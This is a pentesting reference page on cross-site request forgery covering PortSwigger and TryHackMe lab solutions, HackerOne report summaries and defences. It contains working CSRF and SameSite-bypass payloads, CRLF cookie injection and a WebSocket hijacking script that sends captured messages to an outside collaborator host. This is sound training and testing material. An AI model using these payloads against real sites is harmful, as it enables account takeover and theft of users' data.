---
title: "Cross-Site Request Forgery (CSRF)"
type: technique
tags: [client-side, csrf, exploitation, h1, portswigger, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-adv-csrf, h1-scraped-csrf, payloadsallthethings-csrf, git-portswigger-all-labs]
---

# Cross-Site Request Forgery (CSRF)

## What it is

CSRF tricks a victim's browser into sending an authenticated request to a trusted website without the user's knowledge. The attack exploits the browser's automatic cookie submission — if the victim is logged in, their credentials ride along with the forged request.

## How it works

Three conditions must hold simultaneously:
1. The attacker knows (or can predict) the format of a valid request on the target application.
2. The victim has an active authenticated session with the target site.
3. The application does not distinguish between legitimate user requests and forged cross-site requests.

The attacker hosts a page (or sends an email) that causes the victim's browser to emit the target request. Because the browser automatically includes session cookies for the target domain, the server processes the request as if it came from the authenticated user.

## Prerequisites

- Victim must be authenticated to the target site (active session cookie)
- The sensitive action must be triggerable via an HTTP request (typically GET or POST)
- The application has no (or bypassable) CSRF defences
- Attacker can deliver a payload to the victim via email, malicious webpage, or stored content

## Types

### Traditional CSRF (form-based)
State-changing form submissions — money transfers, password changes, account modifications.

### XMLHttpRequest / Fetch CSRF (async)
Asynchronous requests via `XMLHttpRequest` or the Fetch API. Exploits the same session trust relationship but without a page reload.

### SameSite Lax bypass (GET-triggered state change)
Targets endpoints that accept state changes via GET. `SameSite=Lax` allows cookies on top-level navigation GET requests.

### Double Submit Cookie bypass
When the CSRF token is simply `base64(account_number)` or another predictable/reversible value, it can be reverse-engineered.

## Methodology

1. **Identify state-changing requests** — map out POST/GET actions (transfers, password changes, email updates)
2. **Inspect CSRF protections** — look for CSRF tokens in forms, check SameSite cookie attributes, examine Referer validation
3. **Determine bypassability** — is the token present? Is it random? Is it tied to the session? Is it checked server-side?
4. **Build a proof-of-concept form** — craft auto-submit HTML with the target URL and required parameters
5. **Deliver via social engineering** — embed in email link, malicious webpage, or stored XSS payload

### CSRF Token Validation Flaws (PortSwigger taxonomy)

| Flaw | Test | Bypass |
|------|------|--------|
| Token only validated on POST | Change method to GET, remove token | Use GET request |
| Token validated only if present | Remove token parameter entirely | Omit the token |
| Token not tied to user session | Token belongs to global pool | Use own valid token in victim's request |
| Token tied to non-session cookie | `csrfKey` cookie separate from session | Inject attacker's `csrfKey` via header injection |
| Token duplicated in cookie | Cookie value == body value | Set both to any identical value |

## Key Payloads / Examples

### GET-based CSRF (hidden link/image)

```html
<!-- Invisible 0x0 pixel image triggers GET request -->
<img src="http://mybank.thm:8080/dashboard.php?to_account=ATTACKER&amount=1000" width="0" height="0">

<!-- Or a visible link -->
<a href="http://mybank.thm:8080/dashboard.php?to_account=ATTACKER&amount=1000" target="_blank">
  Click Here to Redeem Your Prize
</a>
```

### Auto-submit POST form (traditional CSRF)

```html
<html>
  <body>
    <form action="https://target.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Auto-submit POST form (no token present)

```html
<form method="post" action="http://target.com/changepassword.php" id="csrfform">
  <input type="hidden" name="new_password" value="attacker123">
  <input type="hidden" name="confirm_password" value="attacker123">
  <input type="hidden" name="csrf_token" value="PREDICTED_OR_STOLEN_TOKEN">
</form>
<script>document.getElementById('csrfform').submit();</script>
```

### XMLHttpRequest async CSRF

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://mybank.thm/updatepassword', true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        alert("Action executed!");
    }
};
xhr.send('action=execute&parameter=value');
</script>
```

### JSON POST - AutoSubmit Bypass

With an autosubmit form, you can bypass certain browser protections (such as the Standard option of Enhanced Tracking Protection in Firefox) without using XHR:
```html
<form id="CSRF_POC" action="http://www.example.com/api/setrole" enctype="text/plain" method="POST">
  <!-- This input will send: {"role":admin,"other":"="} -->
  <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>document.getElementById("CSRF_POC").submit();</script>
```

### multipart/form-data With File Upload

Requires user interaction but bypasses traditional file upload CSRF blocks:
```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File( [ "CSRF-filecontent" ], "CSRF-filename" );
    dT.items.add( file );
    document.xss[0].files = dT.files;
    document.xss.submit()
}
</script>

<form style="display: none" name="xss" method="post" action="<target>" enctype="multipart/form-data">
  <input id="file" type="file" name="file"/>
  <input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

### SameSite Lax GET bypass

Lax cookies are forwarded on top-level GET navigations (clicking links). Target a logout or state-change endpoint that accepts GET:
```html
<a href="https://mybank.thm:8080/logout.php" target="_blank">Survey Link!</a>
```

### SameSite Lax + POST (2-minute window exploit)

Chrome treats cookies without a `SameSite` attribute as `Lax` after 2 minutes. Within the 2-minute window after login/logout (when the cookie was last set), those cookies are sent with POST requests too:

```javascript
<script>
function launchAttack() {
    // Step 1: Trigger logout — this updates the isBanned cookie (resets the 2-min window)
    let win = window.open("http://mybank.thm:8080/logout.php", '');
    setTimeout(function() {
        win.close();
        // Step 2: Within 2 minutes, POST request includes the freshly-set cookie
        document.getElementById('bank').submit();
    }, 1000);
}
</script>
<form style="display:none" id="bank" method="post" action="http://mybank.thm:8080/index.php">
  <input name="isBanned" value="true">
</form>
```

### SameSite Lax bypass via `_method` override

Some frameworks (e.g., Rails, Spring) honour a `_method` parameter to override the HTTP verb. A GET request with `_method=POST` is processed as a POST, but the browser sends Lax cookies because the top-level request is a GET:

```html
<script>
  document.location = "https://target.web-security-academy.net/my-account/change-email?email=pwned@attacker.net&_method=POST";
</script>
```

Or as a form:
```html
<html>
  <body>
    <form action="https://target.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### SameSite Strict bypass via client-side redirect gadget

`SameSite=Strict` blocks cookies on all cross-site requests, including top-level navigation. However, if the target site has a client-side redirect that uses attacker-controlled input (e.g., `postId` reflected into a `location.href` change), the redirect occurs within the same origin and carries the session cookie:

```html
<!-- Redirect gadget: /post/comment/confirmation?postId=foo → /post/foo -->
<!-- Path traversal: postId=1/../../my-account/change-email?email=pwned%40user.net%26submit=1 -->
<script>
  document.location = "https://target.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40user.net%26submit=1";
</script>
```

Key insight: the cross-site navigation lands on the same-site redirect gadget; the subsequent redirect to the target endpoint is same-site, so `Strict` cookies are included.

### SameSite Strict bypass via sibling domain (CSWSH)

A sibling subdomain (e.g., `cms.target.net`) is considered same-site. If the sibling has XSS, inject a Cross-Site WebSocket Hijacking (CSWSH) payload that opens a WebSocket to the main app. Since the request originates from a same-site context, `SameSite=Strict` cookies are sent:

```javascript
<script>
    var ws = new WebSocket('wss://target.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://attacker-collaborator.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Full delivery: inject the URL-encoded CSWSH payload via the sibling's reflected XSS parameter:
```html
<script>
    document.location = "https://cms-LABID.web-security-academy.net/login?username=<URL-ENCODED-CSWSH-PAYLOAD>&password=aa";
</script>
```

### SameSite Lax bypass via OAuth cookie refresh

If the app re-issues session cookies via an OAuth `/social-login` endpoint, triggering that endpoint refreshes the 2-minute Lax window, allowing a subsequent POST CSRF to succeed. Use a popup (requires user click to bypass popup blockers):

```html
<form method="POST" action="https://target.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@attacker.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://target.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    };
    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

### Double Submit Cookie bypass (predictable token)

When the CSRF token is just `base64(account_number)`:
1. Decode the token with CyberChef (From Base64)
2. Craft the payload with `base64(victim_account_number)` as the token
3. Set the csrf-token cookie on the attacker subdomain (subdomain cookie injection)

Attacker-controlled subdomain sets the cookie for the parent domain:
```php
<?php
setcookie(
    'csrf-token',
    base64_encode("VICTIM_ACCOUNT_NUMBER"),
    [
        'expires'  => time() + (365 * 24 * 60 * 60),
        'path'     => '/',
        'domain'   => 'mybank.thm',   // parent domain
        'secure'   => false,
        'httponly' => false,
        'samesite' => 'Lax'
    ]
);
?>
```

### Double Submit Cookie bypass (arbitrary matching value)

When the server only checks that the `csrf` cookie matches the `csrf` body parameter (not that either is a real server-issued value), set both to an arbitrary identical value:

```html
<html>
  <body>
    <script>
      document.cookie = "csrf=csrf";
    </script>
    <form action="https://target.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
      <input type="hidden" name="csrf" value="csrf" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Token tied to non-session cookie — HTTP header injection to plant csrfKey

When the CSRF token is validated against a `csrfKey` cookie (not the session cookie), and the attacker can inject headers via a reflected cookie parameter (HTTP Response Splitting), plant the attacker's `csrfKey` into the victim's browser using an `<img>` onerror trigger:

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://target.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@test.com" />
      <input type="hidden" name="csrf" value="ATTACKER_CSRF_TOKEN" />
    </form>
    <!-- Injects attacker's csrfKey cookie via HTTP header injection in search param -->
    <img src="https://target.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_CSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## Referer Header Bypass

`Referer` validation can be bypassed by:
- Stripping the header with browser extensions or `<meta name="referrer" content="no-referrer">`
- Hosting the payload at a URL that contains the target domain as a substring (some naive regex checks)

### Strip Referer header entirely

Some applications only validate Referer when present; omitting it bypasses the check:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://target.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Broken Referer validation — domain as substring

If the server checks only that the target domain appears anywhere in the Referer value (not that it's the origin), append the target domain as a query string to the exploit URL:

```html
<!DOCTYPE html>
<html>
  <head>
    <!-- Force browser to send full URL including query string as Referer -->
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://target.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      // exploit-server URL becomes: https://exploit-server.net/?https://target.web-security-academy.net
      history.pushState({}, "", "/?https://target.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Alternatively set the response header on the exploit server:
```
Referrer-Policy: unsafe-url
```

## CORS Misconfiguration leading to CSRF

A wildcard `Access-Control-Allow-Origin: *` allows any origin to read responses, and when combined with `Access-Control-Allow-Credentials: true` (which itself is forbidden by spec with wildcard), enables authenticated cross-origin reads. Even without credential leakage, submitting forms to permissive CORS endpoints may succeed without CSRF tokens.

## Real-World Examples (HackerOne — paid reports)

The following reports are drawn from 66 paid HackerOne disclosures (2 critical, top bounty $10,000). They illustrate the most impactful CSRF failure classes: absent token validation on privileged management endpoints, token prediction/bypass, WebSocket origin checks missing, and GraphQL mutation CSRF.

### CSRF bypass on GitHub Enterprise management console ($10,000 high — GitHub, #1497169)

The GitHub Enterprise management console — which controls cluster configuration, admin credentials, and deployment settings — validated CSRF tokens for standard requests but the validation could be bypassed by a particular request-encoding technique (e.g., changing `Content-Type` or using a multipart body). An authenticated attacker who could get an Enterprise administrator to visit a malicious page could perform any management console action, including adding admin accounts or modifying cluster settings. **Takeaway:** CSRF protection must be consistently enforced across all content types and encoding variants; multipart and JSON bodies are common bypass vectors when only `application/x-www-form-urlencoded` tokens are checked.

### Argo CD CSRF leading to Kubernetes cluster compromise ($4,660 high — Internet Bug Bounty, #2326194)

Argo CD's web UI lacked CSRF protection on its application-management endpoints. An attacker could forge a cross-site request that modified a deployed application's sync target or injected malicious manifests, resulting in arbitrary workload execution on the Kubernetes cluster. Because Argo CD operates with cluster-admin privileges, CSRF on its API represented a complete cluster compromise. **Takeaway:** continuous-deployment systems operate with infrastructure-level privilege; their management APIs require the same (or stronger) CSRF and authentication controls as the most sensitive internal application.

### GitLab GraphQL mutation CSRF via GET request ($3,370 high — GitLab, #1122408)

GitLab's `/api/graphql` endpoint accepted GraphQL mutations via HTTP GET requests — treating them as read operations despite being state-changing. Because browsers send GET requests freely from `<img>` tags, `<iframe>` srcs, and link prefetching, any GraphQL mutation could be triggered cross-site without a CSRF token. The researcher demonstrated modifying project settings and transferring repositories. **Takeaway:** GraphQL mutations must only be accepted via POST; GET requests to a GraphQL endpoint must be restricted to introspection and queries, never mutations.

### CSRF on Stripe Dashboard — token validation disabled ($2,500 medium — Stripe, #1493437)

Stripe's main dashboard had CSRF token validation silently disabled on a subset of endpoints (likely during a migration or A/B test). The researcher confirmed that state-changing requests — including billing configuration changes — were processed without any token. Because Stripe users are high-value targets, even a short window of missing CSRF protection is critical. **Takeaway:** CSRF token validation must never be toggled off in production; feature flags that affect security controls require explicit security review and rollout monitoring.

### CSRF bypass on TikTok Webcast endpoints ($2,500 medium — TikTok, #1543234)

TikTok's live-streaming (Webcast) API endpoints that controlled stream configuration were missing CSRF protection. An attacker could forge requests to start/stop streams, modify stream metadata, or take control of a live session on behalf of a victim creator. The weak point was that the Webcast sub-domain did not inherit the CSRF controls enforced on the main domain. **Takeaway:** CSRF controls must be applied consistently across all sub-domains and API surfaces; separate sub-domain deployments frequently miss security headers inherited by the main application.

### Mattermost WebSocket CSRF — Uber internal chat information leakage ($2,000 critical — Uber, #201326)

The Mattermost instance at `uchat.uberinternals.com` did not validate the `Origin` header on WebSocket upgrade requests. An attacker on a malicious page could open a WebSocket connection to the internal Mattermost instance (if the victim was already authenticated and on the internal network), read all messages from channels the victim had access to, and receive real-time events. **Takeaway:** WebSocket endpoints must validate the `Origin` header on the upgrade request and reject connections from untrusted origins; the normal SameSite/CSRF token protections do not apply to WebSocket upgrades.

### XSRF token revocation bypass ($1,500 critical — Enjin, #2312217)

Enjin's API token revocation endpoint — used to invalidate OAuth tokens — accepted requests even when the XSRF token was absent or invalid. An attacker could forge a request to silently revoke all of a victim's API tokens, locking them out of connected applications. **Takeaway:** token management endpoints (revoke, rotate, create) are high-impact targets; even "destructive" actions that appear defensive (revoking tokens) are dangerous if they can be triggered cross-site by an attacker.

### HackerOne Slack integration CSRF ($2,500 high — HackerOne, #170552)

Setting up a Slack integration on HackerOne lacked CSRF protection. An attacker could trick a programme admin into unknowingly connecting a malicious Slack workspace to the programme, redirecting all vulnerability notification traffic to the attacker's channel. **Takeaway:** OAuth integration-setup callbacks are state-changing operations; they must include both a CSRF token and a validated `state` parameter to prevent cross-site hijacking of the OAuth flow.

### Discourse account takeover — no CSRF on Yahoo OAuth connect ($512 high — Discourse, #423022)

The endpoint that connected a Yahoo OAuth identity to an existing Discourse account did not validate a CSRF token. An attacker could forge a request that bound the attacker's Yahoo identity to the victim's Discourse account, then use Yahoo login to take over the account. **Takeaway:** "connect account" or "link identity" flows are account-takeover primitives; they must require CSRF tokens and re-authentication before binding a new identity.

### GitLab SAML RelayState ATO ($2,450 medium — GitLab, #1923672)

GitLab validated the SAML RelayState parameter insufficiently, allowing an attacker to supply a value that would redirect the authenticated user's browser to an attacker-controlled URL after SAML login. Combined with a forged SAML request, this enabled account takeover without any user suspicion. **Takeaway:** `RelayState` in SAML flows must be validated as an exact match against an allowlist or a cryptographically signed value; open-redirect within the SSO flow is a direct path to account takeover.

### Shopify business name change — authenticity token not verified ($1,900 medium — Shopify, #994504)

Shopify's endpoint to update a store's business/legal name accepted POST requests without verifying the Rails authenticity token. An attacker could forge a request that changed a merchant's business name, which flows through to invoicing, legal documents, and payment processors. **Takeaway:** every state-changing Rails action must call `protect_from_forgery`; auditing for disabled or skipped CSRF callbacks is a productive source of medium-high severity findings on Rails applications.

## Detection and Defence

| Defence | Notes |
|---------|-------|
| Unpredictable CSRF tokens | Per-session random value, verified server-side, not derivable from account identifiers |
| `SameSite=Strict` cookies | Most reliable; cookies not sent on any cross-site request |
| `SameSite=Lax` cookies | Allows top-level GET navigation; use `Strict` for sensitive actions |
| Referer / Origin header check | Secondary control; can be bypassed. Verify `Origin` header on POST |
| Double Submit Cookie (secure) | Cryptographically random value; compare cookie vs form field |
| CAPTCHA | High-friction, hard to automate; use for critical actions |

**Pentester checks:**
- Capture every state-changing request and replay without the CSRF token
- Modify or remove the token and check if the server still processes the request
- Change request method from POST to GET — some servers only validate token on POST
- Decode the token (try base64, hex) — if it contains predictable data it is bypassable
- Check `SameSite` attribute on all cookies via DevTools → Application → Cookies
- Verify whether `Referer` validation is the only protection (strip it)
- Look for `_method` override support in framework (Rails, Spring, Laravel)
- Hunt client-side redirects that use user-controlled `postId` / `returnTo` parameters
- Check sibling subdomains for XSS — same-site XSS bypasses `SameSite=Strict`
- Test OAuth re-login flows for cookie refresh that opens a Lax POST window

## Tools

- [[burp-suite]] — intercept and replay requests; right-click → Engagement tools → Generate CSRF PoC (enables auto-submit script in Options tab)
- CyberChef — decode CSRF tokens
- `XSRFProbe` — The Prime Cross Site Request Forgery Audit and Exploitation Toolkit
- Burp Collaborator — capture exfiltrated WebSocket messages in CSWSH attacks

## Sources

- THM Advanced CSRF room (`https://tryhackme.com/r/room/csrfV2`)

## From the Wild

### HTB — CrossFit (2020)
- **Technique variant**: XSS to CORS to CSRF, FTP upload, command injection
- **Attack path**: Chain XSS through CORS to forge admin account on subdomain, upload webshell via FTP

### HTB — Oouch (2020)
- **Technique variant**: OAuth2 CSRF, D-Bus Exploitation, uwsgi Exploitation
- **Attack path**: Chain OAuth CSRF for admin token, D-Bus command injection, exploit uwsgi config for root

### HTB — Bankrobber (2019)
- **Technique variant**: XSS, CSRF, SQLi source leak, BOF
- **Attack path**: Chain XSS to steal admin cookies, SQLi to leak code, BOF for SYSTEM

### HTB — SecNotes (2018)
- **Technique variant**: CSRF to Change Password, SMB Write, WSL
- **Attack path**: CSRF in contact form to change admin password, SMB share write for webshell, WSL bash.exe for root

## PortSwigger Labs

### LAB 1 — CSRF vulnerability with no defenses (Apprentice)

No CSRF token, no SameSite restriction. Intercept the email-change POST in Burp, generate CSRF PoC (Engagement tools → Generate CSRF PoC, enable auto-submit), host on exploit server, deliver to victim.

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=<session>

email=attacker@example.com
```

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---

### LAB 2 — CSRF where token validation depends on request method (Practitioner)

Token is validated on POST but not on GET. Change the method to GET and remove the token — the server accepts it.

1. Intercept the POST change-email request; token present.
2. Remove the token → request rejected.
3. Change method to GET, remove token → request accepted (200).
4. Deliver as GET-based CSRF PoC (Burp generates automatically or use `document.location`).

---

### LAB 3 — CSRF where token validation depends on token being present (Practitioner)

Token is validated only when present — removing the parameter entirely bypasses validation.

1. Intercept POST change-email; token present.
2. Delete the `csrf` parameter entirely (not just the value) → request succeeds.
3. Generate CSRF PoC omitting the token field entirely.

---

### LAB 4 — CSRF where token is not tied to user session (Practitioner)

The server maintains a global token pool — any valid token is accepted regardless of which session it belongs to.

Faulty pseudo-code:
```python
def validate_token():
    if request.csrf_token:
        if request.csrf_token in valid_csrf_tokens:
            pass
        else:
            throw_error("CSRF token incorrect. Request rejected.")
```

Exploit: log in as attacker, obtain a valid token, use it in a CSRF PoC targeting the victim.

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@user.net" />
      <input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---

### LAB 5 — CSRF where token is tied to non-session cookie (Practitioner)

Token is bound to a `csrfKey` cookie (not the session cookie). Any matching `csrfKey` + `csrf` token pair from the same server is accepted — even from a different account.

Exploit steps:
1. Log in as attacker, capture `csrfKey` cookie and `csrf` token value.
2. Find HTTP Response Splitting: the search functionality reflects user input into a `Set-Cookie: LastSearchTerm=` response header.
3. Inject attacker's `csrfKey` into victim's browser via the search endpoint using CRLF injection (`%0d%0aSet-Cookie: csrfKey=...`).
4. Use an `<img>` `onerror` to trigger form submission after cookie injection:

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@test.com" />
      <input type="hidden" name="csrf" value="ATTACKER_CSRF_TOKEN" />
    </form>
    <img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_CSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

---

### LAB 6 — CSRF where token is duplicated in cookie (Practitioner)

Server only checks that the `csrf` body parameter matches the `csrf` cookie — it does not verify the value against any server-side state. Set both to any identical arbitrary value.

Testing: remove characters from token only → rejected; remove from cookie only → rejected; remove same characters from both → accepted.

```html
<html>
  <body>
    <script>document.cookie = "csrf=csrf";</script>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
      <input type="hidden" name="csrf" value="csrf" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---

### LAB 7 — SameSite Lax bypass via method override (Practitioner)

Session cookie is `SameSite=Lax`; no CSRF token. Server accepts `_method=POST` override on GET requests (framework method override). GET requests carry Lax cookies on top-level navigation.

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

Or via `document.location` for top-level navigation:
```html
<script>
  document.location = "https://LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@attacker.net&_method=POST";
</script>
```

---

### LAB 8 — SameSite Strict bypass via client-side redirect (Practitioner)

Session cookie is `SameSite=Strict`; no CSRF token. A comment confirmation page (`/post/comment/confirmation?postId=X`) uses `postId` in a client-side JavaScript redirect, and path traversal in `postId` redirects to arbitrary same-origin paths.

Chain:
1. `postId=1/../../my-account/change-email?email=pwned%40user.net%26submit=1`
2. Confirmation page (same-site) redirects → same-site request to change-email endpoint with Strict cookies.

```html
<script>
  document.location = "https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40user.net%26submit=1";
</script>
```

---

### LAB 9 — SameSite Strict bypass via sibling domain (Practitioner)

Session is `SameSite=Strict`. A `cms.` sibling subdomain is same-site and has a reflected XSS in its login username parameter. XSS on the sibling opens a WebSocket to the main app — a Cross-Site WebSocket Hijacking (CSWSH) attack — leaking chat history including credentials.

Steps:
1. Find WebSocket usage at `/chat`.
2. Find `cms.` subdomain via `Access-Control-Allow-Origin` header.
3. Confirm XSS on `cms.` login: `username=<script>alert(1)</script>` works.
4. POST login can be converted to GET for easier URL delivery.
5. Craft CSWSH payload, URL-encode it, inject via `cms.` XSS:

```javascript
// CSWSH payload (before URL encoding)
<script>
    var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() { ws.send("READY"); };
    ws.onmessage = function(event) {
        fetch('https://COLLABORATOR.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

```html
<!-- Delivery via sibling XSS -->
<script>
    document.location = "https://cms-LAB-ID.web-security-academy.net/login?username=URL_ENCODED_PAYLOAD&password=aa";
</script>
```

6. Monitor Burp Collaborator for exfiltrated WebSocket messages containing credentials.

---

### LAB 10 — SameSite Lax bypass via cookie refresh (Practitioner)

Session cookie defaults to `Lax`; no CSRF token; GET not accepted for the change-email endpoint. The app has an OAuth `/social-login` that re-issues a fresh session cookie when visited while already logged in. Triggering `/social-login` opens a 2-minute Lax POST window.

Popup blockers require user interaction to open windows — use an `onclick` handler:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@attacker.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    };
    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

Flow: click → popup opens `/social-login` → new session cookie issued (Lax 2-min window starts) → 5 second delay → POST change-email with new session cookie included.

---

### LAB 11 — CSRF where Referer validation depends on header being present (Practitioner)

Application checks the Referer header but only when present — absent Referer is not rejected. Suppress with `<meta name="referrer" content="no-referrer">`.

```html
<!DOCTYPE html>
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---

### LAB 12 — CSRF with broken Referer validation (Practitioner)

Application requires Referer but only checks that the target domain appears somewhere in the value (substring match, not origin match). Spoof by appending the target domain as a query string to the exploit URL:

```
Referer: https://exploit-server.net/?https://victim-site.com
```

Force the browser to send the full URL including query string using `unsafe-url`:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      history.pushState({}, "", "/?https://LAB-ID.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Also works by adding response header on exploit server: `Referrer-Policy: unsafe-url`
